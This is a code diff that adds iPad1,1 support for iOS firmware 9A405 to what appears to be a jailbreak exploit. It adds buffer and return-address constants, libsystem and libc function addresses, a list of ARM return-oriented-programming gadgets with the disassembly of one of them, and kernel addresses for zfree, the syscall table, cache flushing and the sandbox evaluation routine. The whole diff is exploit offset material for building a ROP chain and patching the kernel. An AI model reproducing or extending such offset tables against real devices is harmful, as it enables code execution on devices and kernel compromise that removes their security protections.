@@ -156,6 +156,7 @@ enum
 
 const char* devices[MAX_DEVICE] =
 {
+    [iPad1_1] = "iPad1,1",
     [iPhone3_1] = "iPhone3,1",
     [iPhone4_1] = "iPhone4,1",
     [iPad2_1] = "iPad2,1",
@@ -169,6 +170,148 @@ const char* firmwares[MAX_FIRMWARE] =
     [FW9A405] = "9A405",
     [FW9A406] = "9A406"
 };
+
+struct constants constants_bootstrap_iPad1_1 =
+{
+    .STRLEN_FILENAME = 29,
+
+    .P1 = 402,
+    .P2 = 619,
+    .P3 = 625,
+    //   p2 address: 0xXXXXXX[0c]
+    .P2_ADDR_LO = 0x0c,
+    .LR_ADDR_LO = 0x10,
+};
+
+struct constants constants_iPad1_1 =
+{
+    .STRLEN_FILENAME = 66,
+
+    .P1 = 402,
+    .P2 = 619,
+    .P3 = 625,
+    //   p2 address: 0xXXXXXX[2c]
+    .P2_ADDR_LO = 0x2c,
+    .LR_ADDR_LO = 0x30,
+};
+
+struct offsets offsets_iPad1_1 =
+{
+    // libsystem_kernel.dylib
+    ._dsc_open = 0x35f66dc4,
+    ._dsc_fstat = 0x35f576f4,
+    ._dsc_chown = 0x35f59518,
+    ._dsc_chmod = (0x35f58ae0 + 1),
+    ._dsc_memcpy = (0x35f5798c + 1),
+    ._dsc_munmap = 0x35f66d68,
+    ._dsc_unlink = (0x35f58eb4 + 1),
+    ._dsc_mkdir = 0x35f59c34,
+    ._dsc_ftruncate = 0x35f59ca0,
+    ._dsc_ioctl = (0x35f58bf8 + 1),
+    ._dsc_close = 0x35f5771c,
+    ._dsc_ptrace = 0x35f67394,
+    ._dsc_bsdthread_terminate = 0x35f66228,
+    ._dsc_shm_open = 0x35f594a8,
+    ._dsc_mmap = (0x35f57658 + 1),
+    ._dsc_mach_task_self = (0x35f65d88 + 1),
+    ._dsc_mach_port_allocate = (0x35f57e44 + 1),
+    ._dsc_mach_port_insert_right = (0x35f57e70 + 1),
+    ._dsc_mach_msg = (0x35f571d4 + 1),
+    ._dsc_mount = 0x35f686e4,
+    ._dsc_unmount = 0x35f69040,
+    ._dsc_syscall = 0x35f67afc,
+    ._dsc_psynch_rw_unlock = 0x35f671a0,
+
+    // libsystem_c.dylib
+    ._dsc_fopen = (0x347d6004 + 1),
+    ._dsc_fread = (0x347dc814 + 1),
+    ._dsc_fclose = (0x347d665c + 1),
+    ._dsc_exit = (0x347d89d0 + 1),
+    ._dsc_syslog = (0x347d0ad0 + 1),
+    ._dsc_sysctl = (0x347cdc64 + 1),
+    ._dsc_malloc = (0x347cd184 + 1),
+    ._dsc_memmem = (0x347e6cf0 + 1),
+    ._dsc_sleep = (0x347e4a54 + 1),
+    ._dsc_proc_pidinfo = (0x347d54e0 + 1),
+    ._dsc_execl = (0x347f8cac + 1),
+    ._dsc_strcpy = 0x347d2d30,
+    ._dsc_sys_dcache_flush = 0x347de80c,
+
+    // __aeabi_cdcmpeq+0x10
+    .LIBC_POP_R0 = 0x3483d340,
+    // __aeabi_cfcmpeq+0x10
+    .LIBC_POP_R0123 = 0x3483db10,
+    // wctomb_l+0x4A
+    .LIBC_POP_R47 = (0x347f0f3e + 1),
+    // wctomb_l+0x44
+    .LIBC_BLX_R4_POP_R47 = (0x347f0f38 + 1),
+    // lockf$NOCANCEL+0x98
+    .LIBC_MOV_SP_R4__POP_R47 = (0x347f6cd8 + 1),
+    // filesec_discard_aclbuf+0x26 
+    .LIBC_STR_R0_R4__POP_R47 = (0x3480a49a + 1),
+    // malloc_default_zone+0x24
+    .LIBC_LDR_R0_R0__POP_R7 = (0x347d04b4 + 1),
+    // strvis+0x32
+    .LIBC_SUB_R0_R4__POP_R4567 = (0x347f5246 + 1),
+    // pthread_mutex_lock+0x1B6
+    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x347c8c82 + 1),
+
+    // libicucore.A.dylib
+    // uloc_toLanguageTag+0x24B2
+    .GADGET_ADD_SP_120_POP8_10_4567 = (0x3707be2e + 1),
+
+    // libxml2.dylib
+    // xmlRegisterInputCallbacks+0x36
+    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x36ee601a + 1),
+
+    // liblaunch.dylib
+    ._dsc_bootstrap_look_up = (0x37421fe8 + 1),
+
+    // libdyld.dylib
+    ._dsc_dlsym = (0x351dc6ec + 1),
+
+    // libxpc.dylib
+    // ___create_with_format_and_arguments_block_invoke_4+0x2c
+    .LIBC_BLX_R4_POP_R457 = (0x3518639c + 1),
+
+    // /System/Library/Frameworks/CoreData.framework/CoreData
+    // _PF_SnowLeopard_CFBasicHashFold+0x78
+    .GADGET_SUBS_R0_R0_R1__POP7 = (0x333c1748 + 1),
+
+    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
+    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
+    .GADGET_MOV_R1_R0__POP_R47 = (0x357a39cc + 1),
+
+    // /System/Library/Frameworks/AddressBook.framework/AddressBook
+    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
+    .GADGET_MOV_R0_R1__POP_R47 = (0x37bba26e + 1),
+    // ABCMultiValueCopyLabelAtIndex+0x28
+    .GADGET_MOV_R0_R4__POP_R47 = (0x37bbdd5c + 1),
+
+    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
+    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
+    .GADGET_MOV_R1_R4__POP_R47 = (0x349220ec + 1),
+
+    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
+    // DDScannerGetMemoryUsed+0x28
+    .GADGET_ADD_R0_R0_R1__POP457 = 0x31567ae8,
+
+    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
+    // vt_Copy_420f_420v_arm+0x220
+    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
+    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
+    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
+    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
+    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
+    .GADGET_HOLY = 0x34f66100,
+
+    .ZFREE = (0x8002f3d0 + 1),
+    .SYSENT = 0x802ccbac,
+    .FLUSH_DCACHE_ALL = 0x80071b0c,
+    .INVALIDATE_ICACHE_ALL = 0x800719c4,
+    .SB_EVALUATE = (0x806030ec + 1)
+};
+
 
 struct constants constants_bootstrap_iPhone3_1 =
 {
@@ -1051,6 +1194,7 @@ struct constants* global_constants[MAX_FIRMWARE][MAX_DEVICE] =
     },
 
     [FW9A405] = {
+        [iPad1_1] = &constants_iPad1_1,
         [iPhone3_1] = &constants_iPhone3_1,
         [iPhone4_1] = &constants_iPhone4_1,
         [iPad2_1] = &constants_iPad2_1,
@@ -1070,6 +1214,7 @@ struct constants* global_constants_bootstrap[MAX_FIRMWARE][MAX_DEVICE] =
     },
 
     [FW9A405] = {
+        [iPad1_1] = &constants_bootstrap_iPad1_1,
         [iPhone3_1] = &constants_bootstrap_iPhone3_1,
         [iPhone4_1] = &constants_bootstrap_iPhone4_1,
         [iPad2_1] = &constants_bootstrap_iPad2_1,
@@ -1089,6 +1234,7 @@ struct offsets* global_offsets[MAX_FIRMWARE][MAX_DEVICE] =
     },
 
     [FW9A405] = {
+        [iPad1_1] = &offsets_iPad1_1,
         [iPhone3_1] = &offsets_iPhone3_1,
         [iPhone4_1] = &offsets_iPhone4_1,
         [iPad2_1] = &offsets_iPad2_1,
